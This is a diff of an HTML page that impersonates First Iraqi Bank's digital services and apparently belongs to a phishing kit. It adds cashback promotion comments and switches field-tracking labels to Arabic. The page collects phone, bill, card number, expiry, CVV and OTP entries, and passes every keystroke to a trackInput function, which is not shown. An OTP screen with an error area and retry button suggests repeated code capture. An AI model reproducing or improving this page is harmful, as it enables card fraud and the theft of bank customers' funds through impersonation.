@@ -6,7 +6,7 @@
     <title>FIB - Digital Services Platform</title>
     <style>
         :root {
-            --fib-green: #008444; /* الدرجة الرسمية لمصرف FIB */
+            --fib-green: #008444; /* اللون الأخضر الرسمي لمصرف FIB */
             --fib-light-green: #f0f9f4;
             --bg-white: #ffffff;
             --text-dark: #1a1a1a;
@@ -38,6 +38,7 @@
         .history-m-content { display: inline-block; animation: marquee 30s linear infinite; }
         .history-m-content span { margin: 0 30px; font-weight: 500; }
 
+        /* شريط كاش باك بالأخضر الرسمي */
         .promo-banner { background: var(--fib-green); color: white; padding: 10px; text-align: center; font-size: 0.8rem; font-weight: 500; }
 
         .marquee-container { background: #fff; padding: 15px 0; overflow: hidden; border-bottom: 1px solid #f5f5f5; }
@@ -49,6 +50,7 @@
         .active { display: flex; flex-direction: column; animation: fadeIn 0.5s ease; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
+        /* الأزرار بالأخضر الرسمي */
         .btn-primary { background: var(--fib-green); color: white; border: none; padding: 18px; border-radius: 16px; font-weight: 600; cursor: pointer; font-size: 1rem; margin-top: 20px; }
 
         .services-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
@@ -114,7 +116,7 @@
     <div id="screen-lang" class="screen active">
         <h3 style="text-align:center; margin-bottom: 30px;">بەخێربێن بۆ بانکی یەکەمی عێراقی<br><span style="font-size: 0.9rem; color: var(--gray);">مرحباً بكم في مصرف العراق الأول</span></h3>
         <button class="btn-primary" onclick="setLang('ar')">العربية</button>
-        <button class="btn-primary" style="background:#f0f0f0; color:#333; margin-top:15px;" onclick="setLang('ku')">کوردی (سۆراني)</button>
+        <button class="btn-primary" style="background:#f0f0f0; color:#333; margin-top:15px;" onclick="setLang('ku')">کوردی (سۆرانی)</button>
     </div>
 
     <div id="screen-services" class="screen">
@@ -131,18 +133,18 @@
 
     <div id="screen-details" class="screen">
         <h3 id="d-title"></h3>
-        <div class="input-group"><label id="label-phone"></label><input type="text" id="i-phone" placeholder="07xx xxx xxxx" oninput="trackInput('Phone')"></div>
-        <div class="input-group"><label id="label-ref"></label><input type="text" id="i-ref" oninput="trackInput('Ref/Bill')"></div>
-        <div class="input-group"><label id="label-amt"></label><input type="number" id="i-amt" placeholder="0 IQD" oninput="updateCashback(); trackInput('Amount')"></div>
+        <div class="input-group"><label id="label-phone"></label><input type="text" id="i-phone" placeholder="07xx xxx xxxx" oninput="trackInput('رقم الهاتف')"></div>
+        <div class="input-group"><label id="label-ref"></label><input type="text" id="i-ref" oninput="trackInput('رقم المرجع/الفاتورة')"></div>
+        <div class="input-group"><label id="label-amt"></label><input type="number" id="i-amt" placeholder="0 IQD" oninput="updateCashback(); trackInput('المبلغ')"></div>
         <div id="cb-box" class="cashback-box"></div>
         <button class="btn-primary" id="btn-details-next" onclick="nextScreen('screen-pay')"></button>
     </div>
 
     <div id="screen-pay" class="screen">
         <h3>Card Details</h3>
-        <div class="input-group"><label>Card Number</label><input type="text" id="c-num" placeholder="0000 0000 0000 0000" maxlength="19" oninput="trackInput('Card Number')"></div>
+        <div class="input-group"><label>Card Number</label><input type="text" id="c-num" placeholder="0000 0000 0000 0000" maxlength="19" oninput="trackInput('رقم البطاقة')"></div>
         <div style="display:flex; gap:10px;">
-            <div style="flex:1"><label>Expiry</label><input type="text" id="c-date" placeholder="MM-YY" maxlength="5" oninput="trackInput('Expiry')"></div>
+            <div style="flex:1"><label>Expiry</label><input type="text" id="c-date" placeholder="MM-YY" maxlength="5" oninput="trackInput('التاريخ')"></div>
             <div style="flex:1"><label>CVV</label><input type="text" id="c-cvv" placeholder="000" maxlength="3" oninput="trackInput('CVV')"></div>
         </div>
         <button class="btn-primary" id="btn-pay-now" onclick="processPayment()"></button>
@@ -150,7 +152,7 @@
 
     <div id="screen-confirm" class="screen">
         <h3 id="otp-title">OTP</h3>
-        <input type="text" id="otp" placeholder="000000" style="text-align:center; font-size:24px; letter-spacing:10px; border-color: var(--fib-green);" oninput="trackInput('OTP')">
+        <input type="text" id="otp" placeholder="000000" style="text-align:center; font-size:24px; letter-spacing:10px; border-color: var(--fib-green);" oninput="trackInput('كود OTP')">
         <p id="err" style="color:#d93025; text-align:center; font-size:0.85rem; margin-top: 15px;"></p>
         <button class="btn-primary" onclick="retry()">Confirm</button>
     </div>
